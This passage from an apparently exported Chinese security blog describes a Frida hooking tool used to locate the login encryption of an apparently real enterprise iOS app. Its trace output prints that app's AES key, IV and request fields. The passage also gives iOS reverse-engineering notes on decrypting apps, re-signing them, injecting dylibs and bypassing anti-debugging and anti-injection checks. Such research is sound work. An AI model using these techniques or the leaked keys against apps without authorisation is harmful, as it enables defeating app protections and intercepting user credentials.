info功能：列出已装应用的应用名、bundleId及沙盒路径 使用（支持grep）：./fridaDev.py -i (| grep xxx) 1234567[*] Device info: Device(id=&quot;83ae210b1d153c611e268b45b54e5f77d575212b&quot;, name=&quot;iPhone&quot;, type=&apos;usb&apos;)app name bundle identify documents pathundefinedQQ浏览器 com.tencent.mttlite file:///private/var/mobile/Containers/Data/Application/0F2137C5-52EC-4C44-9247-9D1E2666AE0C/Documents计算器 com.apple.calculator file:///private/var/mobile/Containers/Data/Application/4A593BCE-1460-4785-BC18-18DFAF5BFFBA/Documents通讯录 com.apple.MobileAddressBook file:///private/var/mobile/Containers/Data/Application/F8C2EB38-1FBE-415B-B562-C910589F66FE/Documents咪咕善跑 org.imohoo.shanpao file:///private/var/mobile/Containers/Data/Application/0FC0A9BF-958C-4BCD-9AF0-5680B414A853/Documents ui（仅支持iOS）功能：dump iOS界面布局，支持打印nextResponder、controller及action 使用： 打开需要dump的应用界面 ./fridaDev.py -u appName 打印响应链nextResponder： n 0x144f6e6c0 打印controller： c 0x144f6e6c0 打印action： a 0x144f6e6c0 1234567891011121314151617181920212223242526272829[*] Device info: Device(id="83ae210b1d153c611e268b45b54e5f77d575212b", name="iPhone", type='usb')&lt;UIWindow: 0x146007e40; frame = (0 0; 320 480); gestureRecognizers = &lt;NSArray: 0x146009290&gt;; layer = &lt;UIWindowLayer: 0x146007dc0&gt;&gt; | &lt;UILayoutContainerView: 0x144d629d0; frame = (0 0; 320 480); autoresize = W+H; gestureRecognizers = &lt;NSArray: 0x14602c450&gt;; layer = &lt;CALayer: 0x144d63ac0&gt;&gt; | | &lt;UINavigationTransitionView: 0x146026be0; frame = (0 0; 320 480); clipsToBounds = YES; autoresize = W+H; layer = &lt;CALayer: 0x146023cf0&gt;&gt; | | | &lt;UIViewControllerWrapperView: 0x144f6fd50; frame = (0 0; 320 480); autoresize = W+H; layer = &lt;CALayer: 0x144f6f2e0&gt;&gt;... | | | | | | | &lt;FireflyButton: 0x144f6e6c0; baseClass = UIButton; frame = (38 120.5; 183 34); clipsToBounds = YES; opaque = NO; layer = &lt;CALayer: 0x144f6d690&gt;&gt; | | | | | | | | &lt;UIButtonLabel: 0x1460665c0; frame = (73.5 6.5; 36 21.5); text = '登录'; opaque = NO; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x1460667e0&gt;&gt; | | | | | | | | | &lt;_UILabelContentLayer: 0x144f67e20&gt; (layer) | | &lt;UINavigationBar: 0x144da8880; frame = (0 20; 320 44); opaque = NO; autoresize = W; tintColor = UIDeviceWhiteColorSpace 1 1; gestureRecognizers = &lt;NSArray: 0x14602ddd0&gt;; layer = &lt;CALayer: 0x1460279d0&gt;&gt; | | | &lt;_UINavigationBarBackground: 0x146026f60; frame = (0 -20; 320 64); opaque = NO; autoresize = W; userInteractionEnabled = NO; layer = &lt;CALayer: 0x14602b8b0&gt;&gt; | | | | &lt;UIImageView: 0x144db8f10; frame = (0 64; 320 0); opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x146023e00&gt;&gt; | | | &lt;_UINavigationBarBackIndicatorView: 0x14602cab0; frame = (8 11.5; 13 21); alpha = 0; opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x144da7510&gt;&gt;&lt;CSNavJViewController 0x1450fe000&gt;, state: appeared, view: &lt;UILayoutContainerView 0x144d629d0&gt; | &lt;FireflyTestLoginViewController 0x144f37c30&gt;, state: appeared, view: &lt;UIView 0x14602d3a0&gt;a 0x144f6e6c0-&gt; loginButtonClickc 0x144f6e6c0-&gt; &lt;FireflyTestLoginViewController: 0x144f37c30&gt;n 0x144f6e6c0-&gt;&lt;UIImageView: 0x144f33530; frame = (30.5 145.5; 259 189); alpha = 0.8; opaque = NO; layer = &lt;CALayer: 0x144f03d00&gt;&gt;--&gt;&lt;UIImageView: 0x144f390a0; frame = (0 0; 320 480); opaque = NO; layer = &lt;CALayer: 0x144f24d10&gt;&gt;---&gt;&lt;UIView: 0x14602d3a0; frame = (0 0; 320 480); autoresize = W+H; layer = &lt;CALayer: 0x144d49060&gt;&gt;----&gt;&lt;FireflyTestLoginViewController: 0x144f37c30&gt;-----&gt;&lt;UIViewControllerWrapperView: 0x144f6fd50; frame = (0 0; 320 480); autoresize = W+H; layer = &lt;CALayer: 0x144f6f2e0&gt;&gt;... dynhook功能：hook对应函数，做你所想 说明：android Hook代码写入android_hook.js，iOS Hook代码写入ios_hook.js，脚本自行判断平台。 使用：./fridaDev.py -d appName 12345678[*] Device info: Device(id=&quot;83ae210b1d153c611e268b45b54e5f77d575212b&quot;, name=&quot;iPhone&quot;, type=&apos;usb&apos;)[+] killing 36988[-] xxx is not found...[+] Injecting script to xxx(37079)+[FireflySecurityUtil aesEncrypt:key:vector:] onEnter...+[FireflySecurityUtil aesEncrypt:key:vector:] onLeave...ret: nil trace功能：追踪函数调用，打印输入输出 说明：android trace修改android_trace.js，iOS trace修改ios_trace.js，脚本自行判断平台。 支持正则，可以发挥你的想象力。 修改如下内容： 123456789101112// usage examplesif (ObjC.available) &#123; trace("-[FireflyTestLoginViewController loginButtonClick]") // trace("-[FireflyTestLoginViewController *]") trace("*[* *ncrypt*]"); // trace("exports:libSystem.B.dylib!CCCrypt"); // trace("exports:libSystem.B.dylib!open"); // trace("exports:*!open*"); &#125; else &#123; send("error: Objective-C Runtime is not available!");&#125; 使用：./fridaDev.py -t bundleId 12345678910111213141516171819202122232425262728[iPhone::com.lzm.khjlHack]-&gt;*** entered -[FireflyTestLoginViewController viewDidLoad]Caller: 0x1840de580 CoreFoundation!__invoking___*** entered -[FireflyTestLoginViewController setIsBool:]Caller: 0x1840de580 CoreFoundation!__invoking___setIsBool: nilretval: &lt;FireflyTestLoginViewController: 0x12de4a180&gt;*** exiting -[FireflyTestLoginViewController setIsBool:]*** entered -[FireflyTestLoginViewController initViews]Caller: 0x1840de580 CoreFoundation!__invoking___*** entered -[FireflyTestLoginViewController BackIamgeViewUI]Caller: 0x1840de580 CoreFoundation!__invoking___retval: &lt;UIView: 0x12de3b400; frame = (0 0; 320 480); autoresize = W+H; layer = &lt;CALayer: 0x1c02292a0&gt;&gt;*** exiting -[FireflyTestLoginViewController BackIamgeViewUI]... enumerate功能：枚举所有类、所有方法、一个类的所有方法、匹配正则的所有类、匹配正则的所有方法 说明：android enumerate修改android_enum.js，iOS enumerate修改ios_enum.js，脚本自行判断平台。 支持正则，可以发挥你的想象力。 修改如下内容： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// usage examplesif (ObjC.available) &#123; // enumerate all classes /* var a = enumAllClasses(); a.forEach(function(s) &#123; console.log(s); &#125;); */ // find classes that match a pattern /* var a = findClasses(/FireflySecurityUtil/i); a.forEach(function(s) &#123; console.log(s); &#125;); */ // enumerate all methods in a class /* var a = enumMethods("CGBLoginViewController") a.forEach(function(s) &#123; console.log(s); &#125;); */ // enumerate all methods /* var d = enumAllMethods(); for (k in d) &#123; console.log(k); d[k].forEach(function(s) &#123; console.log("\t" + s); &#125;); &#125; */ // find methods that match a pattern var d = findMethods(/encrypt|decrypt/i); for (k in d) &#123; console.log(k); d[k].forEach(function(s) &#123; console.log("\t" + s); &#125;); &#125;&#125; else &#123; send("error: Objective-C Runtime is not available!");&#125; 使用：./fridaDev.py -e bundleId 12345678910111213141516171819202122232425262728[*] Device info: Device(id=&quot;83ae210b1d153c611e268b45b54e5f77d575212b&quot;, name=&quot;iPhone&quot;, type=&apos;usb&apos;)CMBCStandardiOSSipKeyboardVC - setNeedEncrypt: - getEncryptedDataWithError: - needEncrypt - initWithKeyboardType:needEncrypt:FireflySecurityUtil + qhd_FireflyRSAEncrypt:cerPath: + qhd_FireflyRSAEncrypt:publicKey: + qhd_aesDecrypt:key:vector: + qhd_aesEncrypt:key:vector: + aesEncrypt:key:vector: + aesDecrypt:key:vector: + FireflyRSAEncrypt:publicKey: + FireflyRSAEncrypt:cerPath:CMCCSafeManager - getEncryptCode: - decryptCode: - getDecryptCode: - encryptCode: - encryptWithContent: - decryptWithContent:FaceResult - encryptRandom - setEncryptRandom:... 实例以某app为例介绍工具使用。 登录界面 登录数据包加密 现在需要破解加解密，分两种方式： 猜解加解密关键字定位加解密函数 正向分析登录功能找到加解密逻辑 猜解猜解的方式存在偶然性，不采用标准库加密或常规加解密命名的就很难找到。 我们尝试使用fridaDev的--enumerate功能枚举加解密逻辑，修改ios_enum.js中的正则匹配枚举方法处代码，正则中修改为encrypt|decrypt. 1234567var d = findMethods(/encrypt|decrypt/i);for (k in d) &#123; console.log(k); d[k].forEach(function(s) &#123; console.log("\t" + s); &#125;);&#125; 运行脚本查看输出 123456789101112131415161718192021222324[*] Device info: Device(id=&quot;83ae210b1d153c611e268b45b54e5f77d575212b&quot;, name=&quot;iPhone&quot;, type=&apos;usb&apos;)CMBCStandardiOSSipKeyboardVC - setNeedEncrypt: - getEncryptedDataWithError: - needEncrypt - initWithKeyboardType:needEncrypt:FireflySecurityUtil + qhd_FireflyRSAEncrypt:cerPath: + qhd_FireflyRSAEncrypt:publicKey: + qhd_aesDecrypt:key:vector: + qhd_aesEncrypt:key:vector: + aesEncrypt:key:vector: + aesDecrypt:key:vector: + FireflyRSAEncrypt:publicKey: + FireflyRSAEncrypt:cerPath:CMCCSafeManager - getEncryptCode: - decryptCode: - getDecryptCode: - encryptCode: - encryptWithContent: - decryptWithContent:... 通过挨个排查或者你dump了界面UI知道view的controller类名，其实已经基本能猜测调用哪些相关加解密函数。 如果你还是不确定哪个类里的那个方法被调用，没关系，我们通过trace功能追踪函数调用来确定具体使用哪个方法。 修改ios_trace.js尾部代码： 1234567if (ObjC.available) &#123; trace("*[CMBCStandardiOSSipKeyboardVC *]"); trace("*[FireflySecurityUtil *]"); trace("*[CMCCSafeManager *]");&#125; else &#123; send("error: Objective-C Runtime is not available!");&#125; 运行代码后启动应用，点击登录查看此处log： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354...*** entered +[FireflySecurityUtil FireflyRSAEncrypt:publicKey:]Caller: 0x1840de580 CoreFoundation!__invoking___FireflyRSAEncrypt: &#123;&quot;flag&quot;:&quot;0&quot;,&quot;ckey&quot;:&quot;AZWKLXOMREDGAKPMTIBHTKOBRVGKNBHC&quot;&#125;publicKey: MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDFV+0lKbisYcFxEaalfN4DMc14fMVTZTFZB1X4MoZtEu6lFpVvmSZT4eaSgp1Vxol8HSsqFncxxtv/GXpqJ3kY1DghafKliSFfTkV1PYoHKGoUYVdwt/HubzQBcC3xh+xiZvspBWy4Bjal//HoHrBBN05R2ZFnU9obS4Xw+jKbOQIDAQAB*** entered +[FireflySecurityUtil stripPublicKeyHeader:]Caller: 0x1840de580 CoreFoundation!__invoking___stripPublicKeyHeader: &lt;30819f30 0d06092a 864886f7 0d010101 05000381 8d003081 89028181 00c557ed 2529b8ac 61c17111 a6a57cde 0331cd78 7cc55365 31590755 f832866d 12eea516 956f9926 53e1e692 829d55c6 897c1d2b 2a167731 c6dbff19 7a6a2779 18d43821 69f2a589 215f4e45 753d8a07 286a1461 5770b7f1 ee6f3401 702df187 ec6266fb 29056cb8 0636a5ff f1e81eb0 41374e51 d9916753 da1b4b85 f0fa329b 39020301 0001&gt;retval: &lt;30818902 818100c5 57ed2529 b8ac61c1 7111a6a5 7cde0331 cd787cc5 53653159 0755f832 866d12ee a516956f 992653e1 e692829d 55c6897c 1d2b2a16 7731c6db ff197a6a 277918d4 382169f2 a589215f 4e45753d 8a07286a 14615770 b7f1ee6f 3401702d f187ec62 66fb2905 6cb80636 a5fff1e8 1eb04137 4e51d991 6753da1b 4b85f0fa 329b3902 03010001&gt;*** exiting +[FireflySecurityUtil stripPublicKeyHeader:]retval: NrbG9/JxK65OMfl9WsFmCYU5Xfr1Av6Q/XOulxeoDc5CSf2AajFgE3CSH6MVHD3YlqCq4/Z20PevpakS1LMjsIpiywsOsrrfDESr87ATJ3Ta4TuGfg7ooLwAbUVHh77a4ZJInEaz63cpZuviy5b/fsftGjqllWtqxATNjU3dRBI=*** exiting +[FireflySecurityUtil FireflyRSAEncrypt:publicKey:]*** entered +[FireflySecurityUtil isJailBreak]Caller: 0x1840de580 CoreFoundation!__invoking___retval: 0x1*** exiting +[FireflySecurityUtil isJailBreak]...*** entered -[FireflySecurityUtil aesToken]Caller: 0x1840de580 CoreFoundation!__invoking___retval: AZWKLXOMREDGAKPM5pblzNXaVqAXmBwl*** exiting -[FireflySecurityUtil aesToken]*** entered +[FireflySecurityUtil aesEncrypt:key:vector:]Caller: 0x1840de580 CoreFoundation!__invoking___aesEncrypt: &#123;&quot;secRan&quot;:&quot;W9zvEM&quot;,&quot;staffId&quot;:&quot;F&quot;,&quot;password&quot;:&quot;NmQk8hKN9Sn1UTQha4JnAxYnfJiUGdwTw+Lws9rWHhsXgBt2ZARjOfrxH3Ka166Wias83OROXYjof6NvZ9zMJaKAP1NBPsiWZEE7gkRDlpCKwR\/AVMwOzA4xAFcb7WKWIWrJg7NjpsvMvsjxzqxx\/2sR4zglTx8P6jpHWigCEf0=&quot;,&quot;imeiCode&quot;:&quot;3823ACEE-A647-46F8-8D14-8065E5C2B0C6&quot;,&quot;validateImgCode&quot;:&quot;&quot;&#125;key: AZWKLXOMREDGAKPM5pblzNXaVqAXmBwlvector: 1234567812345678retval: yUF8H3QiqR21mTIrNxTTRtNx4l2IAyJ6AT0r7ATs9vO5MgYCahUT3qRxrT+qWDhyDD2znN5t1esauWYHPt+2AAd4NrfcYVs/QPMOstjpGcp4wey1HssAYNk2OtAKz5lRo6Bnw8CFiKMWdpdBS5Y4/G80irK0Dq12oPc52I956UtP3zCFNqE2rfQFZqcd35FA0CajccT5Ny6v/qKoScApnTLBmTKMmj3na+PTzyIOLXr1ObjwY9C+Snygf4xzb9AEU73WbIjxhsfdG6m3mEGrugw8Gn3nj/Eqb3mREUkvsQMt9FezDd4PWnJTRM6r6D5S5WI7ACYJU8kYDF0VK4H0Ixpe+xNoLdtYabgtcoSd9zkTFADW/SY6JzJaa6BwHpWoBeOree/dRgr6xyA8H4Zphw==*** exiting +[FireflySecurityUtil aesEncrypt:key:vector:]... 可以看到点击登录后调用+[FireflySecurityUtil FireflyRSAEncrypt:publicKey:]对cKey加密，调用+[FireflySecurityUtil aesEncrypt:key:vector:]对请求数据进行aes加密，成功定位数据加解密函数。 你甚至可以直接在trace代码中写: 1trace(&quot;*[ *ncrypt*]&quot;); 同样可以动态定位加密函数。 正向分析从界面入手找到登录view对应的controller，或者登录button对应的action，可以通过cycript或者lldb方式: 但是我们现在使用fridaDev来确定登录逻辑入口 首先使用fridaDev的ui功能dump页面，通过登录button找到对应action。 123456789101112131415161718192021222324252627282930[*] Device info: Device(id="33010c846ea011df002c0781f922a10c9f2aca48", name="iPad 4", type='usb')&lt;UIWindow: 0x146007e40; frame = (0 0; 320 480); gestureRecognizers = &lt;NSArray: 0x146009290&gt;; layer = &lt;UIWindowLayer: 0x146007dc0&gt;&gt; | &lt;UILayoutContainerView: 0x144d629d0; frame = (0 0; 320 480); autoresize = W+H; gestureRecognizers = &lt;NSArray: 0x14602c450&gt;; layer = &lt;CALayer: 0x144d63ac0&gt;&gt; | | &lt;UINavigationTransitionView: 0x146026be0; frame = (0 0; 320 480); clipsToBounds = YES; autoresize = W+H; layer = &lt;CALayer: 0x146023cf0&gt;&gt; | | | &lt;UIViewControllerWrapperView: 0x144f6fd50; frame = (0 0; 320 480); autoresize = W+H; layer = &lt;CALayer: 0x144f6f2e0&gt;&gt; | | | | &lt;UIView: 0x14602d3a0; frame = (0 0; 320 480); autoresize = W+H; layer = &lt;CALayer: 0x144d49060&gt;&gt; | | | | | &lt;UIImageView: 0x144f390a0; frame = (0 0; 320 480); opaque = NO; layer = &lt;CALayer: 0x144f24d10&gt;&gt; | | | | | | &lt;UIImageView: 0x144f33530; frame = (30.5 145.5; 259 189); alpha = 0.8; opaque = NO; layer = &lt;CALayer: 0x144f03d00&gt;&gt; | | | | | | | &lt;FireflyUserNameTextFieldView: 0x144f34260; baseClass = UITextField; frame = (19 26; 221 32); text = ''; clipsToBounds = YES; opaque = NO; gestureRecognizers = &lt;NSArray: 0x144f72190&gt;; layer = &lt;CALayer: 0x144f39a50&gt;&gt; | | | | | | | | &lt;UIImageView: 0x146032820; frame = (10 7; 18.5 18.5); opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x146032670&gt;&gt; | | | | | | | | &lt;UITextFieldLabel: 0x146033470; frame = (48 0; 193 32); text = '请输入员工号'; opaque = NO; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x146033680&gt;&gt; | | | | | | | | | &lt;_UILabelContentLayer: 0x14606e1d0&gt; (layer) | | | | | | | &lt;CSJCMBCCDSIPInputField: 0x146034e00; baseClass = UITextField; frame = (19 77; 221 32.5); text = ''; clipsToBounds = YES; opaque = NO; gestureRecognizers = &lt;NSArray: 0x144f74e20&gt;; layer = &lt;CALayer: 0x146034460&gt;&gt; | | | | | | | | &lt;UIImageView: 0x144f6bae0; frame = (10 7; 18.5 18.5); opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x144f2f1b0&gt;&gt; | | | | | | | | &lt;UITextFieldLabel: 0x144f6d060; frame = (48 0; 193 32); text = '请输入密码'; opaque = NO; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x144f6d270&gt;&gt; | | | | | | | | | &lt;_UILabelContentLayer: 0x14606f280&gt; (layer) | | | | | | | &lt;FireflyButton: 0x144f6e6c0; baseClass = UIButton; frame = (38 120.5; 183 34); clipsToBounds = YES; opaque = NO; layer = &lt;CALayer: 0x144f6d690&gt;&gt; | | | | | | | | &lt;UIButtonLabel: 0x1460665c0; frame = (73.5 6.5; 36 21.5); text = '登录'; opaque = NO; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x1460667e0&gt;&gt; | | | | | | | | | &lt;_UILabelContentLayer: 0x144f67e20&gt; (layer) | | &lt;UINavigationBar: 0x144da8880; frame = (0 20; 320 44); opaque = NO; autoresize = W; tintColor = UIDeviceWhiteColorSpace 1 1; gestureRecognizers = &lt;NSArray: 0x14602ddd0&gt;; layer = &lt;CALayer: 0x1460279d0&gt;&gt; | | | &lt;_UINavigationBarBackground: 0x146026f60; frame = (0 -20; 320 64); opaque = NO; autoresize = W; userInteractionEnabled = NO; layer = &lt;CALayer: 0x14602b8b0&gt;&gt; | | | | &lt;UIImageView: 0x144db8f10; frame = (0 64; 320 0); opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x146023e00&gt;&gt; | | | &lt;_UINavigationBarBackIndicatorView: 0x14602cab0; frame = (8 11.5; 13 21); alpha = 0; opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x144da7510&gt;&gt;&lt;CSNavJViewController 0x1450fe000&gt;, state: appeared, view: &lt;UILayoutContainerView 0x144d629d0&gt; | &lt;FireflyTestLoginViewController 0x144f37c30&gt;, state: appeared, view: &lt;UIView 0x14602d3a0&gt;a 0x144f6e6c0-&gt; loginButtonClickc 0x144f6e6c0-&gt; &lt;FireflyTestLoginViewController: 0x144f37c30&gt; 可以看到button对应的controller为FireflyTestLoginViewController类，button动作为loginButtonClick。 剩下就是根据IDA&amp;Hopper静态分析Math-O，配合fridaDev trace摸清函数调用栈的工作了，当然你也可以使用lldb调试bt打印堆栈来分析函数调用。 顺藤你会一步步摸到加解密逻辑的瓜。]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Frida</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS逆向笔记]]></title>
    <url>%2F2018%2F10%2F12%2FiOS%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[iOS系统安全架构 安全启动链 信任链：系统启动 -&gt; boot rom -&gt; LLB -&gt; iBoot -&gt; kernal 系统软件授权 固件 -&gt; cpu -&gt; itunes ==&gt; 服务器验证 低版本服务器返回验证许可，可通过保存shsh绕过验证 高版本返回验证许可+随机串 应用代码签名 所有可执行代码（动态库，动态资源）运行时验证签名 运行时进程安全 沙盒：/var/mobile/Containers/Data/Application/[GUID] DEP ASLR 数据加密保护 硬件秘钥 + 密码秘钥 -&gt; 类秘钥 硬件秘钥 -&gt; 文件系统秘钥 类秘钥 + 文件系统秘钥 -&gt; 文件秘钥 =&gt; 文件内容 越狱 Cydia Substrate MobileHooker MobileLoader safe mode ssh连接ios设备 openssh ssh root@ip 通过usb连接： usbmuxd -&gt; tcpreplay.py -t 22:xx brew install libimobiledevice -&gt; iproxy 2222 22 ssh root@localhost -p xx ssh key不匹配，删除.ssh/know_hosts对应可以即可 配置免密码登录越狱设备 1234ssh-keygen -t rsa -P ''ssh-copy-id -i /Users/username/.ssh/id_rsa root@ip或者安装sshpass自己设置密码:brew install https://raw.githubusercontent.com/kadwanev/bigboybrew/master/Library/Formula/sshpass.rb 终端输入中文 123456cd /var/roottouch .inputrcecho 'set convert-meta off' &gt;&gt; .inputrcecho 'set meta-flag on' &gt;&gt; .inputrcecho 'set output-meta on' &gt;&gt; .inputrcecho 'set input-meta on' &gt;&gt; .inputrc 插件 ps：安装adv-cmds 绕过app签名：安装appsync 文件显示：安装apple file conduit 2 fileza 越狱工具 next.tweakboxapp.com app文件结构和构建 查看符号表：nm -nm 依赖库、汇编等：otool -L / -tV 从源代码到ipa的构建过程 数据存储 property list plutil -convert xml1 xx -o xx.plist User Defaults sandbox -&gt; Library -&gt; Preferences -&gt; xx.plist Archive Database sqlite keyChain Keychain Dumper RuntimeHook Method Swizzle 针对objective-C，利用runtime，替换Dispatch table中SEL和IMP的对应关系。 IOS黑魔法－Method Swizzling Objective-C Method Swizzling 的最佳实践 如何在 Swift 中高效地使用 Method Swizzling fishhook rebind_symbols：遍历查找懒加载表和非懒加载表的符号并替换地址。 https://github.com/facebook/fishhook Cydia Substrate MSHookMessageEx -&gt; objC replace Objective-C message implementations MSHookFunction -&gt; c hijack native code to your own implementation http://iphonedevwiki.net/index.php/Cydia_Substrate ARM汇编push {r0} &lt;==&gt; str r0,[sp,#-4]! pop {r0} &lt;==&gt; ldr r0,[sp],#4 汇编使用intel模式：https://github.com/vadimcn/vscode-lldb/issues/87 模拟器使用x86架构，32位入栈。64位rdi、rsi、rdx、rcx、r8、r9，多余参数入栈。 真机arm架构，32位r0-3，64位w0-8。 Mach-O 文件架构 lipo -info whatsApp file whatsApp Header otool -hv whatsApp MachOView 魔数 通用格式：0xcafebabe armv7：0xfeedface arm64：0xfeedfacf 文件类型 OBJECT：1 EXECUTE：2 DYLIB：6 Load commands -&gt; n * Segment otool -lv whatsApp (lldb) image list -e -f Load commands -&gt; LC_SEGMENT(_TEXT) -&gt; VM address 加载地址 + 段虚拟地址 = 文件加载地址 Data -&gt; n * Section Mach-O动态链接（延迟加载） * Code Signature codesign -dvvvv whatsApp App签名 查看加密标识： otool -l whatsApp | grep crypt 查看电脑中证书 security find-identity -v -p codesigning 获取描述文件（embedded.mobileprovision） 苹果官网获取 新建工程真机安装后在包中获取 查看：security cms -D -i embedded.mobileprovision 拷贝至要签名文件中 生成授权文件 security cms -D -i embedded.mobileprovision &gt; entitlements_full.plist /usr/libexec/PlistBuddy -x -c ‘Print:Entitlements’ entitlements_full.plist &gt; entitlements.plist 重签名 codesign -fs “iPhone Developer: xxx（2中证书名）” –no-strict –entitlements=xxx（4中授权文件） Payload/xxx.app 如果有extension，可删可重签名 如果新加动态库，需要签名 压缩为ipa zip -qr target.ipa Payload 动态库 clang编译objec并签名，放入Library-&gt;load dylibrary-&gt;DynamicLibaries中 导出和隐藏符号 static export_list -fvisibility=hidden 函数调用顺序 __attribute__((constructor)) main __attribute__((destructor)) 基于c++动态库 基于oc动态库 注入可执行文件 LC_LOAD_DYLIB 工具: insert_dylib 查看：otool -L 应用砸壳 查看加壳 otool -l xx(mach-o) | grep cryptid 从itools导出ipa 利用scp导出执行文件（打开app，ps找到进程） 砸壳工具 dumpdecrypted 查找Document路径: cycript -p WeChat NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES)[0] AloneMonkey/dumpdecrypted Clutch frida-ios-dump class-dump https://github.com/nygard/class-dump 官方工具修正后编译： CDObjectiveC2Processor.m 224h 1objc2Class.data = value &amp; ~3; //error: value &amp; ~7; ./class-dump mach-o_file -H -o ./Headers 通过 lipo mach-o_file -thin armv7 -output mach-o_file.armv7 瘦身提取砸壳架构 Reveal cydia中添加BigBoss源安装Reveal2Loader，开启reveal使用 高版本reveal需要将RevealServer（help-&gt;show reveal library in finder-&gt;ios library）重命名为libReveal.dylib，并和libReveal.plist一同放入ios的Library-&gt;MobileSubstrate-&gt;DynamicLibraries中 plist文件内容： 1&#123; Filter = &#123; Bundles = ( &quot;bundleID&quot; ); &#125;; &#125; MonkeyDev cycript cycript 静态分析 工具 hopper IDA arm汇编，结构体！ 动态调试 处理debugserver 下载/Developer/usr/bin/debugserver 授权文件entitlements.plist内容： com.apple.springboard.debugapplications run-unsigned-code get-task-allow task_for_pid-allow 签名 上传至/usr/bin/debugserver lldb + debugserver 连接 映射端口： python tcpreply.py -t 22:2222 1234:1234 手机：debugserver *:1234 -a WhatsApp pc： llvm –&gt; process connect connect://localhost:1234 调试指令 image list -o -f b -[xx xxx] br s -a 0xaaaaaa po $r0 p/x $r0 x/s $r1 register read memory read br list / br com add 1.1 : DONE xcode调试 新建与app同名工程 运行脚本 run 安装chisel or 使用 MokeyDev ps: 定位button的action事件 传统: [btn allTargets] //xxx [btn allControlEvents] //yyy [btn actionsForTarget:xxx forControlEvent:yyy] 使用chisel: pviews pactions btn Theos tweak 执行$THEOS/bin/nic.pl创建工程 编写hook代码 123456789%hook ViewController-(void)clickme:(id)sender&#123; NSLog(@&quot;Click me hooked !!!&quot;); %log; %orig; //执行原方法&#125;%end 编译 make make package make install iOSOpenDev（13年没更新了） MonkeyDev 查看Log输出 安装libimobiledevice工具(需要usbmuxd): brew install –HEAD libimobiledevice 使用如下命令查看输出Log: idevicesyslog | grep ‘xxx’ 或者使用自带的console.app程序查看。 Oplayer lite 去广告 使用frida-ios-dump砸壳 用class-dump导出头文件 用reveal定位广告view 用xcode lldb调试找到广告的addSubview:调用位置 使用hooper静态分析逻辑 用Theos写插件改变逻辑去广告 SnapChat 消息tips： 使用cycript或者reveal找到view对应的viewcontroller 通过theos的logify.pl hook一个类所有方法找到具体调用 通过lldb打印具体调用的执行堆栈 – bt tweak找不到类可以通过声明@class xxx解决 迁移到非越狱设备Frida数据加密 字符串加密 数据存储加密 网络数据加密 反调试与反注入 反调试 ptrace 1ptrace(PT_DENY_ATTACH, 0, 0, 0); 123void *handle = dlopen(0, RTLD_GLOBAL | RTLD_NOW); ptrace_ptr_t ptrace_ptr = (ptrace_ptr_t)dlsym(handle, "ptrace"); ptrace_ptr(PT_DENY_ATTACH, 0, 0, 0); sysctl 使用sysctl获取当前进程，标志位p_flag对比P_TRACED 1234567891011121314151617181920BOOL isDebuggerPresent()&#123; int name[4]; struct kinfo_proc info; size_t info_size = sizeof(info); info.kp_proc.p_flag = 0; name[0] = CTL_KERN; name[1] = KERN_PROC; name[2] = KERN_PROC_PID; name[3] = getpid(); if(sysctl(name, 4, &amp;info, &amp;info_size, NULL, 0) == -1)&#123; NSLog(@"sysctl error..."); return NO; &#125; return ((info.kp_proc.p_flag &amp; P_TRACED) != 0);&#125; syscall 1syscall(26, 31 , 0, 0, 0); 反反调试 通过fish hook hook ptrace hook dlsym hook syscall hook sysctl 反注入 编译加入标志位 1-Wl,-sectcreate,__RESTRICT,__restrict,/dev/null 原理，增加__RESTRICT这个section dylib的注入一般是通过DYLD_INSERT_LIBRARIES这个环境变量来实现的，在dyld源码中： 123case restrictedBySegment: dyld::log(&quot;main executable (%s) has __RESTRICT/__restrict section\n&quot;, sExecPath); break; 故存在该分段即可忽略DYLD_开头的环境变量，从而防止dylib注入。 检测加载动态库路径中是否有DynamicLibraries（测试没用） 12345678910111213BOOL isInjected0()&#123; int count = _dyld_image_count(); if(count &gt; 0)&#123; for(int i=0; i&lt;count; i++)&#123; const char* dyld = _dyld_get_image_name(i); if(strstr(dyld, &quot;DynamicLibraries&quot;))&#123; return YES; &#125; &#125; return NO; &#125; return NO;&#125; 检测是否存在环境变量DYLD_INSERT_LIBRARIES（测试有用） 123456BOOL isInjected1()&#123; char* env = getenv(&quot;DYLD_INSERT_LIBRARIES&quot;); if(env) return YES; return NO;&#125; 反反注入 修改mach-o文件中__RESTRICT字段中restrict字符串为其他字符串 混淆 类名和方法名混淆 宏定义替换 ios-class-guard 直接替换MachO文件 修改 __objc_classname 修改 __objc_methname OLLVM​]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Blockchain WordCloud]]></title>
    <url>%2F2018%2F08%2F23%2FBlockchain-WordCloud%2F</url>
    <content type="text"><![CDATA[区块链安全云词 爬虫：scrapy数据库：postgresql分词：jieba词频：py脚本（注意数据清洗)云词：wordart字体：Aa荷包鼓鼓]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>BlockChain</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[#DASP# Short Addresses (9)]]></title>
    <url>%2F2018%2F08%2F20%2FDASP-Short-Addresses-9%2F</url>
